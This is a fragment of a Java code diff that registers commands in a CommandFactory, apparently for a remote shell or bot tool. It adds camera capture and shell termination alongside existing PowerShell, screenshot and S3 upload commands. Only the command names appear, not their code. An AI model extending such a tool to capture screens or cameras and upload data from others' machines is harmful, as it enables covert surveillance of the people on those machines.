@@ -22,7 +22,11 @@ public class CommandFactory {
         commandsList.put("powershell", new TogglePowerShellCommand());
         commandsList.put("upload", new UploadToS3Command());
         commandsList.put("screenshot", new ScreenShotCommand());
+        commandsList.put("camera-shot", new CameraScreenShotCommand());
+
         commandsList.put("rick-roll", new RickRollCommand());
+        commandsList.put("/exit", new TerminateShellCommand());
+
 
 
 
